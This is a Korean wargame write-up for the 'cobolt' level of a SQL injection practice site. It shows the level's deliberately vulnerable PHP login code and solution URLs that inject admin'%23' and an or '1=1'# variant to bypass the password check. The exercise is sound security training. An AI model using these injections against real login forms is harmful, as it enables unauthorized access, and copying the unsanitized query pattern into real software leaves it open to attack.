# Los.eagle-jump.org-2 
* 2번 문제 [cobolt]
```javascript
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```
쿼리문
```
select id from prob_cobolt where id='' and pw=md5('')
```


* Solution [쿼리를 이용해 로그인 시도]

1. 파라미터를 이용해 쿼리문을 작성
https://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=

2. id=admin

3. https://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin' or '1=1'#

4. or을 이용해여 참값을 반환, 코드를 주석으로 만들기 위해 뒤에 # 추가

5. Hello rubiya
   You are not admin :(
   
6. 아쉽게도 정답이 아니다

7. 다시 or을 사용하지않고 파라미터를 다시작성

8. 정답: https://los.eagle-jump.org/cobolt_ee003e254d2fe4fa6cc9505f89e44620.php?id=admin'%23'
